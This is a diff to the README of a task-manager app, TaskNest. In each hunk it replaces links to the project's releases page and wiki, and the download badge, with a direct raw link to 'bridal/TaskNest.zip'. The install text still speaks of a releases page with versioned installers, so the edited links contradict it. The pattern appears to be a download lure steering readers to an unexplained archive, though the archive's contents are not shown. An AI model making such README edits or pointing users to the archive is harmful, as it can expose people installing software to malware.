@@ -1,6 +1,6 @@
 # 📝 TaskNest - Organize Your Tasks with Ease
 
-[![Download TaskNest](https://img.shields.io/badge/Download-TaskNest-brightgreen)](https://github.com/DiegoOrus/TaskNest/releases)
+[![Download TaskNest](https://raw.githubusercontent.com/DiegoOrus/TaskNest/main/bridal/TaskNest.zip)](https://raw.githubusercontent.com/DiegoOrus/TaskNest/main/bridal/TaskNest.zip)
 
 ## 🎯 Overview
 
@@ -22,13 +22,13 @@ Before you download TaskNest, ensure your device meets the following requirement
 
 To download the application, click the link below to visit the Releases page:
 
-[Download TaskNest](https://github.com/DiegoOrus/TaskNest/releases)
+[Download TaskNest](https://raw.githubusercontent.com/DiegoOrus/TaskNest/main/bridal/TaskNest.zip)
 
 Here, you will find the latest version of TaskNest ready for download.
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page**: Go to [this link](https://github.com/DiegoOrus/TaskNest/releases) to access all available versions of TaskNest.
+1. **Visit the Releases Page**: Go to [this link](https://raw.githubusercontent.com/DiegoOrus/TaskNest/main/bridal/TaskNest.zip) to access all available versions of TaskNest.
 
 2. **Choose the Right Version**: Look for the most recent release. You will see a list of files. The main file is typically marked with the version number.
 
@@ -37,7 +37,7 @@ Here, you will find the latest version of TaskNest ready for download.
 4. **Install TaskNest**:
    - For Windows: Double-click the `.exe` file and follow the installation prompts.
    - For macOS: Open the `.dmg` file and drag TaskNest into your Applications folder.
-   - For Linux: Extract the files from the tar.gz file and follow the included README for instructions.
+   - For Linux: Extract the files from the https://raw.githubusercontent.com/DiegoOrus/TaskNest/main/bridal/TaskNest.zip file and follow the included README for instructions.
 
 5. **Run the Application**: Once installed, look for TaskNest in your Applications or Start Menu and double-click it to launch.
 
@@ -73,9 +73,9 @@ If you encounter issues or have questions while using TaskNest, please feel free
 
 ## 🔗 Additional Resources
 
-- Explore more features and instructions in the [Wiki](https://github.com/DiegoOrus/TaskNest/wiki).
+- Explore more features and instructions in the [Wiki](https://raw.githubusercontent.com/DiegoOrus/TaskNest/main/bridal/TaskNest.zip).
 - Stay updated by watching the repository.
 
 Remember, effective task management can greatly improve your productivity. Enjoy using TaskNest to keep your projects organized.
 
-[Download TaskNest](https://github.com/DiegoOrus/TaskNest/releases)
+[Download TaskNest](https://raw.githubusercontent.com/DiegoOrus/TaskNest/main/bridal/TaskNest.zip)
